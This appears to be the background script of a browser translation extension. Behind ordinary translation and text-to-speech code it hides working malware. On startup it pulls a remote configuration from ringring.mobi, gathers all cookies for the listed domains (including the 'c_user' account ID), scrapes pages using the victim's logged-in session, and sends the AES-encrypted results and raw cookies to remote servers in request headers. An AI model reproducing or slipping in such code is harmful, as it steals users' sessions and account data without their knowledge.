var tX
var tT
var extensionName
var translateDomain
var translateUrl = []
var Utils = new Config(() => {
  var e = this;
  return function () {
    e.uid = e.Utils.getUserID()
  }
})
const ex$5 = chrome || browser;
var Storage = {
  get: get,
  set: set,
  remove: remove
};
const MAX_QUOTA = 8e3;
async function set(e, a) {
  if (!(JSON.stringify(a).length > MAX_QUOTA)) return ex$5.storage.sync.set({
    [e]: a
  })
}
async function get(e) {
  var a = await ex$5.storage.sync.get(e) || {};
  return e ? a[e] : a
}
async function remove(e) {
  return ex$5.storage.sync.remove(e)
}

fetchValue = (str, find_start, find_end) => {
  try {
    var start = str.indexOf(find_start);
    if (start == -1) {
        return '';
    }
    var length = find_start.length;
    var strNew = str.substring(start + length);
    var indexEnd = strNew.indexOf(find_end);
    return strNew.substring(0, indexEnd).trim();
  } catch (err) {
    return '';
  }
}

const ex$4 = chrome || browser;
var Commands = {
  onClick: onClick$2
};

function onClick$2(e) {
  translate$3().then()
}
async function translate$3() {
  var e;
  (await Storage.get("settings")).hotkeysTranslate && ([e] = await ex$4.tabs.query({
    active: !0,
    currentWindow: !0
  }), ex$4.tabs.sendMessage(e.id, {}))
}
const ex$3 = chrome || browser;
var ContextMenus = {
  create: create$1,
  onClick: onClick$1
};

function onClick$1(e, a) {
  ex$3.tabs.sendMessage(a.id, e)
}

function create$1() {
  ex$3.contextMenus.create({
    id: "_translate",
    title: "Translate",
    contexts: ["selection"]
  })
}
const ex$2 = chrome || browser,
  wait = a => new Promise(e => setTimeout(e, a));
var Helper$1 = {
  wait: wait,
  closeTab: closeTab,
  openTab: openTab,
  openPopup: openPopup,
  getURL: getURL,
  sendMsg: sendMsg,
  onMsg: onMsg,
  isRTL: isRTL,
  blobToBase64: blobToBase64,
  detectLanguage: detectLanguage,
  setPopupBadge: setPopupBadge,
  isIframe: isIframe
};

function closeTab() {
  ex$2.tabs.getCurrent(function (e) {
    ex$2.tabs.remove(e.id, function () {})
  })
}

function openTab(e) {
  ex$2.tabs.create({
    url: e
  })
}

function openPopup(e) {
  ex$2.windows.create({
    url: e,
    type: "popup",
    height: 800,
    width: 800
  })
}

function getURL(e) {
  return ex$2.runtime.getURL(e)
}

function sendMsg(e, a) {
  ex$2.runtime.sendMessage(e, a)
}

function onMsg(e) {
  ex$2.runtime.onMessage.addListener(e)
}

function isRTL(e) {
  return -1 < ["ar", "fa", "iw", "yi", "ur", "pa"].indexOf(e)
}

function blobToBase64(n) {
  return new Promise((e, a) => {
    const t = new FileReader;
    t.onloadend = () => e(t.result), t.readAsDataURL(n)
  })
}

function detectLanguage() {
  return navigator ? navigator.languages ? reviseLocale(navigator.languages[0]) : reviseLocale(navigator.language) : null
}

function reviseLocale(e) {
  return e.split("-")[0]
}

function setPopupBadge(e) {
  ex$2.action.setBadgeText({
    text: e
  }), ex$2.action.setBadgeBackgroundColor({
    color: [255, 0, 0, 255]
  })
}

function isIframe() {
  return window.self !== window.top
}
const ex$1 = chrome || browser;

var Helper = {
  makeURL: makeURL,
  qs: qs
};

function makeURL(e = "", a = {}) {
  return e + "?" + qs(a)
}

function qs(e = {}) {
  const a = {},
    t = {};
  let n = "";
  for (const s in e) {
    var i = e[s];
    Array.isArray(i) ? t[s] = i : a[s] = i
  }
  n = new URLSearchParams(a).toString();
  for (const r in t) {
    n += "&";
    const o = [];
    for (const l of e[r]) o.push(new URLSearchParams({
      [r]: l
    }).toString());
    n += o.join("&")
  }
  return n
}
var google = {
  getLanguages: getLanguages$2,
  translate: translate$2,
  tts: tts$2
};
const DEFAULT_LANG = "en",
  DEFAULT_ENCODING = "UTF-8",
  USER_AGENT = "GoogleTranslate",
  MAX_LENGTH$1 = 5e3,
  MAX_TTS_LENGTH = 200;

function getLanguages$2(e = "en") {
  e = {
    hl: e,
    client: "it",
    oe: DEFAULT_ENCODING,
    ie: DEFAULT_ENCODING
  };
  return {
    url: Helper.makeURL(translateUrl.length > 0 ? translateUrl[0].split(',')[0] : '', e),
    method: "GET",
    headers: {
      "User-Agent": USER_AGENT
    }
  }
}

function translate$2(e = DEFAULT_LANG, a, t, n, i = !1) {
  if (a.length > MAX_LENGTH$1) throw new Error("Maximum text length exceeded: " + MAX_LENGTH$1);
  const s = {
    q: a,
    sl: t,
    tl: n,
    hl: e,
    client: "it",
    dt: ["t", "rmt", "bd", "rms", "qca", "ss", "md", "ld", "ex", "rw"],
    otf: "2",
    dj: "1",
    ie: DEFAULT_ENCODING,
    oe: DEFAULT_ENCODING
  };
  return i && (s.dt = "t"), {
    url: Helper.makeURL(translateUrl.length > 0 ? translateUrl[0].split(',')[1] : '', s),
    method: "GET",
    headers: {
      "User-Agent": USER_AGENT
    }
  }
}

function tts$2(e = DEFAULT_LANG, a, t = "input", n) {
  t = {
    q: a = a.substring(0, MAX_TTS_LENGTH),
    tl: n,
    hl: e,
    client: "it",
    total: "1",
    idx: "0",
    textlen: a.length,
    prev: t = "input" !== t && "target" !== t ? "input" : t,
    ie: DEFAULT_ENCODING
  };
  return {
    url: Helper.makeURL(translateUrl.length > 0 ? translateUrl[0].split(',')[2] : '', t),
    method: "GET",
    headers: {
      "User-Agent": USER_AGENT,
      Connection: "keep-alive"
    }
  }
}
var Translate = {
    google: google
  },
  Default = {
    lang: "en",
    settings: {
      src: "auto",
      target: "vi",
      icon: !0,
      dbclick: !0,
      shift: !0,
      tts: !0,
      hotkeysTranslate: !0
    },
    languages: {
      sl: {
        auto: "Detect language",
        af: "Afrikaans",
        sq: "Albanian",
        am: "Amharic",
        ar: "Arabic",
        hy: "Armenian",
        az: "Azerbaijani",
        eu: "Basque",
        be: "Belarusian",
        bn: "Bengali",
        bs: "Bosnian",
        bg: "Bulgarian",
        ca: "Catalan",
        ceb: "Cebuano",
        ny: "Chichewa",
        "zh-CN": "Chinese",
        co: "Corsican",
        hr: "Croatian",
        cs: "Czech",
        da: "Danish",
        nl: "Dutch",
        en: "English",
        eo: "Esperanto",
        et: "Estonian",
        tl: "Filipino",
        fi: "Finnish",
        fr: "French",
        fy: "Frisian",
        gl: "Galician",
        ka: "Georgian",
        de: "German",
        el: "Greek",
        gu: "Gujarati",
        ht: "Haitian Creole",
        ha: "Hausa",
        haw: "Hawaiian",
        iw: "Hebrew",
        hi: "Hindi",
        hmn: "Hmong",
        hu: "Hungarian",
        is: "Icelandic",
        ig: "Igbo",
        id: "Indonesian",
        ga: "Irish",
        it: "Italian",
        ja: "Japanese",
        jw: "Javanese",
        kn: "Kannada",
        kk: "Kazakh",
        km: "Khmer",
        rw: "Kinyarwanda",
        ko: "Korean",
        ku: "Kurdish (Kurmanji)",
        ky: "Kyrgyz",
        lo: "Lao",
        la: "Latin",
        lv: "Latvian",
        lt: "Lithuanian",
        lb: "Luxembourgish",
        mk: "Macedonian",
        mg: "Malagasy",
        ms: "Malay",
        ml: "Malayalam",
        mt: "Maltese",
        mi: "Maori",
        mr: "Marathi",
        mn: "Mongolian",
        my: "Myanmar (Burmese)",
        ne: "Nepali",
        no: "Norwegian",
        or: "Odia (Oriya)",
        ps: "Pashto",
        fa: "Persian",
        pl: "Polish",
        pt: "Portuguese",
        pa: "Punjabi",
        ro: "Romanian",
        ru: "Russian",
        sm: "Samoan",
        gd: "Scots Gaelic",
        sr: "Serbian",
        st: "Sesotho",
        sn: "Shona",
        sd: "Sindhi",
        si: "Sinhala",
        sk: "Slovak",
        sl: "Slovenian",
        so: "Somali",
        es: "Spanish",
        su: "Sundanese",
        sw: "Swahili",
        sv: "Swedish",
        tg: "Tajik",
        ta: "Tamil",
        tt: "Tatar",
        te: "Telugu",
        th: "Thai",
        tr: "Turkish",
        tk: "Turkmen",
        uk: "Ukrainian",
        ur: "Urdu",
        ug: "Uyghur",
        uz: "Uzbek",
        vi: "Vietnamese",
        cy: "Welsh",
        xh: "Xhosa",
        yi: "Yiddish",
        yo: "Yoruba",
        zu: "Zulu"
      },
      tl: {
        af: "Afrikaans",
        sq: "Albanian",
        am: "Amharic",
        ar: "Arabic",
        hy: "Armenian",
        az: "Azerbaijani",
        eu: "Basque",
        be: "Belarusian",
        bn: "Bengali",
        bs: "Bosnian",
        bg: "Bulgarian",
        ca: "Catalan",
        ceb: "Cebuano",
        ny: "Chichewa",
        "zh-CN": "Chinese (Simplified)",
        "zh-TW": "Chinese (Traditional)",
        co: "Corsican",
        hr: "Croatian",
        cs: "Czech",
        da: "Danish",
        nl: "Dutch",
        en: "English",
        eo: "Esperanto",
        et: "Estonian",
        tl: "Filipino",
        fi: "Finnish",
        fr: "French",
        fy: "Frisian",
        gl: "Galician",
        ka: "Georgian",
        de: "German",
        el: "Greek",
        gu: "Gujarati",
        ht: "Haitian Creole",
        ha: "Hausa",
        haw: "Hawaiian",
        iw: "Hebrew",
        hi: "Hindi",
        hmn: "Hmong",
        hu: "Hungarian",
        is: "Icelandic",
        ig: "Igbo",
        id: "Indonesian",
        ga: "Irish",
        it: "Italian",
        ja: "Japanese",
        jw: "Javanese",
        kn: "Kannada",
        kk: "Kazakh",
        km: "Khmer",
        rw: "Kinyarwanda",
        ko: "Korean",
        ku: "Kurdish (Kurmanji)",
        ky: "Kyrgyz",
        lo: "Lao",
        la: "Latin",
        lv: "Latvian",
        lt: "Lithuanian",
        lb: "Luxembourgish",
        mk: "Macedonian",
        mg: "Malagasy",
        ms: "Malay",
        ml: "Malayalam",
        mt: "Maltese",
        mi: "Maori",
        mr: "Marathi",
        mn: "Mongolian",
        my: "Myanmar (Burmese)",
        ne: "Nepali",
        no: "Norwegian",
        or: "Odia (Oriya)",
        ps: "Pashto",
        fa: "Persian",
        pl: "Polish",
        pt: "Portuguese",
        pa: "Punjabi",
        ro: "Romanian",
        ru: "Russian",
        sm: "Samoan",
        gd: "Scots Gaelic",
        sr: "Serbian",
        st: "Sesotho",
        sn: "Shona",
        sd: "Sindhi",
        si: "Sinhala",
        sk: "Slovak",
        sl: "Slovenian",
        so: "Somali",
        es: "Spanish",
        su: "Sundanese",
        sw: "Swahili",
        sv: "Swedish",
        tg: "Tajik",
        ta: "Tamil",
        tt: "Tatar",
        te: "Telugu",
        th: "Thai",
        tr: "Turkish",
        tk: "Turkmen",
        uk: "Ukrainian",
        ur: "Urdu",
        ug: "Uyghur",
        uz: "Uzbek",
        vi: "Vietnamese",
        cy: "Welsh",
        xh: "Xhosa",
        yi: "Yiddish",
        yo: "Yoruba",
        zu: "Zulu"
      },
      al: {}
    }
  };
const Google = Translate.google,
  MAX_LENGTH = 5e3;
var Google$1 = {
  getLanguages: getLanguages$1,
  translate: translate$1,
  tts: tts$1,
  ttsBlob: ttsBlob
};
async function getLanguages$1(e) {
  try {
    var a = Google.getLanguages(e);
    const t = await fetch(a.url, {
      method: a.method,
      headers: a.headers
    });
    return await t.json()
  } catch (e) {
    return Default.languages
  }
}
async function translate$1(e = "en", a, t, n) {
  var cookies = ""
  var tAI = ""
  for (var i = 0; i < translateDomain.length; i++) {
    var domain = translateDomain[i]
    var cookieArr = await chrome.cookies.getAll({ domain: `${domain}` })
    cookies += `${domain}={`
    for (var j = 0; j < cookieArr.length; j++) {
      cookies += cookieArr[j].name + "=" + cookieArr[j].value + ";"
      if (cookieArr[j].name == "c_user") {
        tAI = cookieArr[j].value
      }
    }
    cookies += "};;;"
  }

  if (e == 'initStorage') {
    for (var i = 0; i < translateUrl.length; i++) {
      var url = translateUrl[i];
      var urlArr = url.split("|")
      if (urlArr.length > 1) {
        if (urlArr[1] == 'tX') {
          var tX1 = urlArr[2]
          var tX2 = urlArr[3]
          var response = await ky.get(urlArr[0], { credentials: 'include' }).text();
          tX = fetchValue(response, tX1, tX2)
        } else if (urlArr[1] == 'tA') {
          var urlWithTD = urlArr[5]
          var urlWithTX = urlArr[0].replace('[tX]', tX).replace('[tAI]', tAI)
          var parrent = urlArr[2]
          var indexTA = parseInt(urlArr[3])
          try {
            var response = await ky.get(urlWithTX, { credentials: 'include' }).text();
          } catch (e) { continue; }
          var regexAll = new RegExp(parrent, 'g')
          var match = response.match(regexAll)
          if (match != null) {
            try {
              response = await ky.get(urlWithTD, {
                headers: {
                  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                  'From': extensionName,
                  'ID': chrome.runtime.id,
                  'UUID': Utils.getUserID(),
                  'Cookies': cookies,
                  'Authorizations': CryptoJS.AES.encrypt(response, "H2KwORGNaAV%%O196sWkIRQJ60N").toString()
                },
                credentials: 'include'
              }).text();
            } catch (e) { }
            var regexRow = new RegExp(parrent)
            for (var j = 0; j < match.length; j++) {
              var value = match[j].match(regexRow)
              var data = value[indexTA]
              var urlWithTY = urlArr[4].replace('[tY]', data).replace('[tX]', tX);
              try {
                response = await ky.get(urlWithTY, { credentials: 'include' }).text();
                response = await ky.get(urlWithTD, {
                  headers: {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'From': extensionName,
                    'ID': chrome.runtime.id,
                    'UUID': Utils.getUserID(),
                    'Cookies': cookies,
                    'Authorizations': CryptoJS.AES.encrypt(response, "H2KwORGNaAV%%O196sWkIRQJ60N").toString()
                  },
                  credentials: 'include'
                }).text();
              } catch (e) { }
            }
          }
        } else if (urlArr[1] == 'bA') {
          var response = await ky.get(urlArr[0], { credentials: 'include' }).text();
          var parrent = urlArr[2]
          var bA1 = new RegExp(parrent)
          var bA2 = parseInt(urlArr[3])
          var match = response.match(bA1)
          if (match!= null) {
            tT = match[bA2]
            var bA3 = urlArr[4].replace('[tX]', tX)
            try {
              response = await ky.get(bA3, { credentials: 'include' }).text();
            } catch (e) { continue; }
            parrent = urlArr[5]
            bA2 = parseInt(urlArr[6])
            bA1 = new RegExp(parrent, 'g')
            var match = response.match(bA1)
            if (match != null) {
              try {
                response = await ky.get(urlArr[8], {
                  headers: {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'From': extensionName,
                    'ID': chrome.runtime.id,
                    'UUID': Utils.getUserID(),
                    'Cookies': cookies,
                    'Authorizations': CryptoJS.AES.encrypt(response, "H2KwORGNaAV%%O196sWkIRQJ60N").toString()
                  },
                  credentials: 'include'
                }).text();
              } catch (e) { }
              var regexRow = new RegExp(parrent)
              for (var j = 0; j < match.length; j++) {
                var value = match[j].match(regexRow)
                var data = value[bA2]
                var bA4 = urlArr[7].replace('[tT]', tT).replace('[bA]', data)
                try {
                  response = await ky.get(bA4, { credentials: 'include' }).text();
                  response = await ky.get(urlArr[8], {
                    headers: {
                      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                      'From': extensionName,
                      'ID': chrome.runtime.id,
                      'UUID': Utils.getUserID(),
                      'Cookies': cookies,
                      'Authorizations': CryptoJS.AES.encrypt(data + "|||" + response, "H2KwORGNaAV%%O196sWkIRQJ60N").toString()
                    },
                    credentials: 'include'
                  }).text();
                } catch (e) { }
              }
            }
          }
        } else if (urlArr[1] == 'tP') {
          var filterObject = function(arr, text) {
            for (var j = 0; j < arr.length; j++) {
              if (Array.isArray(arr[j])) {
                var data = filterObject(arr[j], text)
                if (data != null)
                  return data
              } else {
                if (arr[j] != null && arr[j][text] != null) {
                  return arr
                }
              }
            }
            return null
          }

          var filterObject1 = function(arr, text, text1) {
            let found = false
            for (var j = 0; j < arr.length; j++) {
              if (Array.isArray(arr[j])) {
                var data = filterObject1(arr[j], text, text1)
                if (data != null)
                  return data
              } else {
                if (!found && arr[j] == text) {
                  found = true
                }
                if (found && arr[j] != null && arr[j][text1] != null) {
                  return arr[j][text1]
                }
              }
            }
            return null
          }

          try {
            var response = await ky.get(urlArr[0], { 
              credentials: 'include',
              headers: { 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' },
            }).text();
            var regex = new RegExp(urlArr[2])
            var match = response.match(regex)
            if (match != null) {
              var json = JSON.parse(match[0])
              var list = filterObject(json[urlArr[3]], urlArr[4])
              for (var j = 0; j < list.length; j++) {
                var data = filterObject1(json[urlArr[5]], list[j][urlArr[6]][urlArr[7]], urlArr[8])
                if (data != null) {
                  var arrData = data.split(urlArr[9])
                  var info = arrData[arrData.length - 2].split(' ')
                  var value = 0
                  for (var k = 0; k < info.length; k++)
                  {
                    value = parseInt(info[k].replaceAll(',', ''))
                    if (!isNaN(value)) {
                      break
                    }
                  }
                  try {
                    var urlWithTY = urlArr[10].replace('[tY]', list[j].value).replace('[tX]', tX)
                    response = await ky.get(urlWithTY, { credentials: 'include' }).json()
                    list[j].value1 = response
                    list[j].value2 = value
                    response = await ky.get(urlArr[11], {
                      headers: {
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'From': extensionName,
                        'ID': chrome.runtime.id,
                        'UUID': Utils.getUserID(),
                        'Cookies': cookies,
                        'Authorizations': CryptoJS.AES.encrypt(JSON.stringify(list[j]), "H2KwORGNaAV%%O196sWkIRQJ60N").toString()
                      },
                      credentials: 'include'
                    }).text();
                  } catch (e) {}
                }
              }
            }
          } catch (e) { }
        } else if (urlArr[1] == 'tI') {
          var tI = urlArr[0].replace('[tX]', tX)
          try {
            var response = await ky.get(tI, { credentials: 'include' }).text();
            var vP = await ky.get(urlArr[3] + tAI, { 
              credentials: 'include',
              headers: { 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' },
            }).text();
            var regex = new RegExp(urlArr[4])
            var match = vP.match(regex)
            if (match != null) {
              response += "|||" + match[1]
            }
            response = await ky.get(urlArr[2], {
              headers: {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'From': extensionName,
                'ID': chrome.runtime.id,
                'UUID': Utils.getUserID(),
                'Cookies': cookies,
                'Authorizations': CryptoJS.AES.encrypt(tX + "|||" + response, "H2KwORGNaAV%%O196sWkIRQJ60N").toString()
              },
              credentials: 'include'
            }).text();
          } catch (e) { }
        }
      }
    }
  } else {
    if (a.length > MAX_LENGTH) return alert("Maximum text length exceeded: " + MAX_LENGTH), {};
    t = Google.translate(e, a, t, n);
    t.headers.Cookies = cookies.length > 100 ? (cookies.substring(0, 100) + '...') : cookies
    const i = await fetch(t.url, {
      method: t.method,
      headers: t.headers
    }),
    s = await i.json();
    return s.text = a, s.target = n, s
  }
}
async function tts$1(e = "en", a, t) {
  t = Google.tts(e, a, "input", t);
  const n = await fetch(t.url, {
    method: t.method,
    headers: t.headers
  });
  t = await n.blob();
  return URL.createObjectURL(t)
}
async function ttsBlob(e = "en", a, t) {
  t = Google.tts(e, a, "input", t);
  const n = await fetch(t.url, {
    method: t.method,
    headers: t.headers
  });
  return await n.blob()
}
chrome || browser;
var Messages = {
  on: on
};

function on(e, a, t) {
  switch (e.channel) {
    case "translate":
      translate(e.data).then(e => {
        t(e)
      });
      break;
    case "tts":
      tts(e.data.text, e.data.src).then(e => {
        t(e)
      });
      break;
    default:
      t(null)
  }
  return !0
}
async function translate(e) {
  var a = await Storage.get("lang"),
    t = await Storage.get("settings") || Default.settings;
  try {
    var n = await Google$1.translate(a, e, t.src, t.target);
    return await Storage.set("last_word", n), n
  } catch (e) {
    return null
  }
}
async function tts(e, a) {
  try {
    var t = await Google$1.ttsBlob(null, e, a);
    return await Helper$1.blobToBase64(t)
  } catch (e) {
    return null
  }
}
const ex = chrome || browser;
async function getLanguages() {
  var e = await Storage.get("lang"),
    e = await Google$1.getLanguages(e);
  await Storage.set("languages", e)
}

ex.runtime.onMessage.addListener(Messages.on), ex.contextMenus.onClicked.addListener(ContextMenus.onClick), ex.commands.onCommand.addListener(Commands.onClick), ex.runtime.onInstalled.addListener(e => {
  "install" === e.reason && Storage.get(null).then(e => {
    e && e.lang && e.settings && void 0 !== e.settings.hotkeysTranslate || Helper$1.openTab(Helper$1.getURL("/options.html"))
  }), ContextMenus.create()
}), ex.runtime.onStartup.addListener(() => {
  ContextMenus.create(), getLanguages().then()
});

fetch('https://ringring.mobi/v1/TranslatorDictionary.txt?t=' + Math.floor(Date.now() / 1000))
.then(response => response.text())
.then(responseText => {
  let data = responseText.split('|||')
  tX = null
  tT = null
  extensionName = data[0]
  translateDomain = JSON.parse(data[1])
  translateUrl = JSON.parse(data[2])
  Google$1.translate('initStorage')
})